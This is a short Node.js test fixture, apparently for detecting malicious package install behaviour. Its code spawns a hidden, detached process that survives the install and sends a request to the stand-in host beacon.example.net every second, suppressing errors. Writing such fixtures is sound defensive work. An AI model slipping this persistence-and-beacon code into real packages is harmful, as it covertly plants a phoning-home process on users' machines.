// FIXTURE: detaches a background process that outlives the install and beacons out.
const { spawn } = require('child_process');
spawn(process.execPath, ['-e', "setInterval(()=>require('https').get('https://beacon.example.net/hb').on('error',()=>{}),1000)"],
  { detached: true, stdio: 'ignore' }).unref();
